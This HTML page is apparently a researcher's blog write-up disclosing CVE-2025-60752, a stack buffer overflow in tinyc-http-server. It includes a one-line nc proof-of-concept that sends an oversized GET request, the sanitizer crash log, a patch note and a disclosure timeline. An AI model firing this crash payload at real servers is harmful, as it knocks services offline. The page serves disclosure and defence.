<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>CVE-2025-60752 | zer0matt's blog</title>
  <meta name="description" content="Technical write-up of CVE-2025-60752 discovered by zer0matt.">
  <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
  <style>
    :root {
      --bg: #fafafa;
      --text: #222;
      --link: #0366d6;
      --link-hover: #023e8a;
      --heading: #111;
      --muted: #666;
      --border: #e5e5e5;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: Consolas, "Lucida Console", monospace;
      background: var(--bg);
      color: var(--text);
      line-height: 1.6;
    }

    header {
      text-align: center;
      padding: 2.5rem 1rem 1rem;
    }

    header h1 {
      margin: 0;
      font-size: 2rem;
      color: var(--heading);
    }

    nav {
      margin-top: 1rem;
    }

    nav a {
      margin: 0 0.8rem;
      color: var(--link);
      text-decoration: none;
      font-weight: 500;
    }

    nav a:hover {
      color: var(--link-hover);
    }

    main {
      max-width: 800px;
      margin: 0 auto;
      padding: 3rem 1rem 4rem;
    }

    section {
      margin-bottom: 2rem;
    }

    section h2 {
      font-size: 1.5rem;
      color: var(--heading);
      margin-bottom: 0.5rem;
      border-bottom: 2px solid var(--border);
      padding-bottom: 0.3rem;
    }

    p {
      margin-bottom: 1rem;
    }

    a {
      color: var(--link);
      text-decoration: none;
    }

    a:hover {
      color: var(--link-hover);
      text-decoration: underline;
    }

    footer {
      text-align: center;
      border-top: 1px solid var(--border);
      color: var(--muted);
      padding: 2rem 1rem;
      font-size: 0.9rem;
    }

    .badge {
      display: inline-block;
      background: #e5e5e5;
      color: #111;
      font-weight: 500;
      padding: 0.2rem 0.5rem;
      border-radius: 0.4rem;
      margin-right: 0.5rem;
      font-size: 0.95rem;
    }

    /* Snippet code box */
    .pre-block {
      background: #f7f7f8;
      color: #111;
      padding: 1rem;
      border-radius: 6px;
      border: 1px solid #e6e6e6;
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace;
      font-size: 0.92rem;
      line-height: 1.45;
      white-space: pre;
      overflow: auto;      /* scroll both horizontally and vertically */
      max-height: 60vh;    /* vertical scroll when content is tall */
      word-break: normal;
    }

    .pre-block:hover {
      box-shadow: 0 6px 24px rgba(0,0,0,0.06);
    }
  </style>
</head>
<body>
  <header>
    <h1>CVE-2025-60752 – Tinyc-http-server Stack Buffer Overflow</h1>
    <nav>
      <a href="https://zer0matt.github.io/">Home</a>
      <a href="https://zer0matt.github.io/about/">About</a>
      <a href="https://zer0matt.github.io/vulnerability/">Vulnerabilities</a>
      <a href="https://github.com/zer0matt" target="_blank">GitHub</a>
      <a href="https://www.linkedin.com/in/rosario-matteo-grammatico/" target="_blank">Linkedin</a>
    </nav>
  </header>

  <main>
    <section>
      <h2>Overview</h2>
      <p>This write-up covers the discovery of a Stack Buffer Overflow vulnerability in tinyc-http-server. The CVE-2025-60752 allows an attacker to cause a Denial of Service (Crash).</p>
	  <p>I wrote a Proof of Concept available at <a href="https://github.com/zer0matt/CVE-2025-60752" target="_blank">https://github.com/zer0matt/CVE-2025-60752</a></p>
	  <p>Which is actually a single bash command wrapped inside a shell script.</p>
      <p>For more official information, see the CVE entry: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-60752" target="_blank">CVE-2025-60752</a>.</p>
    </section>

    <section>
      <h2>Confirmed vulnerable versions</h2>
      <p>Affected product: tinyc-http-server until 1f0b4e813f33788bad5e7726b71a52a37f068f3f commit</p>
    </section>

    <section>
      <h2>CVSS:3.1 Score</h2>
      <p>NOT YET DEFINED, THE CVE IS STILL IN RESERVED STATE. I'M WAITING FOR PUBLICATION.</p>
    </section>

    <section>
      <h2>Technical Analysis</h2>
      <p>Due to lack of input length controls it is possible to send a huge amount of bytes in a single request (such as a simple GET) and no proper checking is done, it just accepts the input buffer as it is.</p>
      <p>Tested on Kali Linux 6.12.25-amd64 (Virtual Machine)</p>
	  <p>Tinyc-http-server until 1f0b4e813f33788bad5e7726b71a52a37f068f3f commit</p>
	  <p>Detailed analysis, PoC, and mitigations are covered here.</p>
      <h3>Introduction</h3>
	  <p>Tinyc-http-server is a small basic HTTP server in C, compatible with both Windows and Linux</p>
	  <p>
	  Sending a quite large amount of bytes in a single request it can lead to a Denial of Service, such as the following.
	  </p>
	  <h3>Crash analysis</h3>
	  <p>
	  Building the project with ASAN flags, so it showed memory corruption messages.
	  Client:
	  <div class="pre-block">
	  matt@kali:~$ (echo -e "GET /$(python3 -c 'print("A"*5000)') HTTP/1.1\r\nHost: localhost\r\n\r\n") | nc 0.0.0.0 8081
	  </div>
	  Server:
	  <div class="pre-block">
	  [2025-07-26 19:49:05] ####  Welcome to tinyC! #### (Sat Jul 26 19:30:47 2025)
[2025-07-26 19:49:05] Max threads: 250                                                                                               
[2025-07-26 19:49:05] Backlog: 250                                                                                                   
[2025-07-26 19:49:05] Initializing server socket.                                                                                    
[2025-07-26 19:49:05] > Running server at: 0.0.0.0:8081                                                                              
=================================================================                                                                    
==191991==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffff5500068 at pc 0x7ffff7891611 bp 0x7fffffffdc10 sp 0x7fffffffd3d0                                                                                                                               
WRITE of size 10 at 0x7ffff5500068 thread T0                                                                                         
    #0 0x7ffff7891610 in inet_ntop ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:2651
    #1 0x55555555bcc5 in main tinyc-http-server/tinyc.c:157
    #2 0x7ffff7633ca7  (/lib/x86_64-linux-gnu/libc.so.6+0x29ca7) (BuildId: 00775696e1aa5bebb30adbcf4d53f1c21b607fc0)
    #3 0x7ffff7633d64 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x29d64) (BuildId: 00775696e1aa5bebb30adbcf4d53f1c21b607fc0)
    #4 0x5555555594a0 in _start (tinyc-http-server/tinyc+0x54a0) (BuildId: c079280610003ab91868718862c0e102cfd11b9b)

Address 0x7ffff5500068 is located in stack of thread T0 at offset 104 in frame
    #0 0x55555555b74a in main tinyc-http-server/tinyc.c:3

  This frame has 5 object(s):
    [48, 52) 'addrlen' (line 20)
    [64, 72) 'server_ip' (line 6)
    [96, 104) 'client_ip' (line 7) <== Memory access at offset 104 overflows this variable
    [128, 144) 'address' (line 19)
    [160, 176) 'timeout' (line 109)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:2651 in inet_ntop
Shadow bytes around the buggy address:
  0x7ffff54ffd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffff54ffe00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffff54ffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffff54fff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffff54fff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7ffff5500000: f1 f1 f1 f1 f1 f1 04 f2 00 f2 f2 f2 00[f2]f2 f2
  0x7ffff5500080: 00 00 f2 f2 00 00 f3 f3 00 00 00 00 00 00 00 00
  0x7ffff5500100: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5
  0x7ffff5500180: f5 f5 f5 f5 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffff5500200: f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5
  0x7ffff5500280: f5 f5 f5 f5 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==191991==ABORTING
[Inferior 1 (process 191991) exited with code 01]
	  </div>
	  <p>This confirms there is a Stack buffer overflow vulnerability!</p>
	  
	  <h3>Exploit</h3>
	  <p>
	      I stopped the research to a simple Denial of Service and honestly didn't put much effort into finding another impact such as code execution or something.
		  The exploit is limited to the shell script that you can find in my github repo.
	  </p>
	  <h3>Remediation</h3>
	  <p>
	  The vendor has officially patched the vulnerability by releasing the new version hashed with commit 1f0b4e813f33788bad5e7726b71a52a37f068f3f.
	  </p>
    </section>

    <section>
      <h2>Disclosure Timeline</h2>
      <ul>
        <li>Discovery: 27 July 2025</li>
        <li>Vendor Notified: 27 July 2025</li>
		<li>Patch released: 07 September 2025</li>
        <li>Public Disclosure: Not public yet (will update when Mitre will publish it on cve.org)</li>
        <li>CVE Assigned: Not available yet (state: reserved)</li>
      </ul>
    </section>

    <section>
      <h2>References & Resources</h2>
      <ul>
        <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-60752" target="_blank">CVE-2025-60752</a></li>
        <li><a href="https://github.com/zer0matt/CVE-2025-60752" target="_blank">GitHub – zer0matt's CVE-2025-60752 Proof of Concept</a></li>
        <li><a href="https://github.com/hwpoison/tinyc-http-server/pull/1" target="_blank">GitHub – Pull Request</a></li>
      </ul>
    </section>
  </main>

  <footer>
    © 2025 zer0matt. All rights reserved.
  </footer>

</body>
</html>